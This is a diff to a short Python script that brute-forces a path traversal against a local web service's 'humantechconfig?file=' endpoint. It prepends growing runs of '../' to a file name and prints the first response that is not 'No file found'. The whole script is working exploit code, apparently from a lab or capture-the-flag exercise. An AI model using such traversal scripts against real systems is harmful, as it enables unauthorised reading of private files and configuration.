@@ -10,12 +10,14 @@
 
 
 import urllib.request as requests
-url = "http://127.0.0.1:8082/humantechconfig?file=human.conf"
+url_pt1 = "http://127.0.0.1:8082/humantechconfig?file="
+url_pt2 = "human.conf"
+traversal = "../"
 
-traversal = "/../.."
-
-for i in range(10):
-  req = requests.urlopen(url + str(traversal * i) + "/root")
-  print ("Site: ", (url + str(traversal * i) + "/root"))
-  print(req.read())
+for i in range(1, 10):
+  req = requests.urlopen(url_pt1 + str(traversal * i) + url_pt2)
+  read_site = req.read()
+  if not "No file found" in str(read_site):
+    print(read_site)
+    break
   
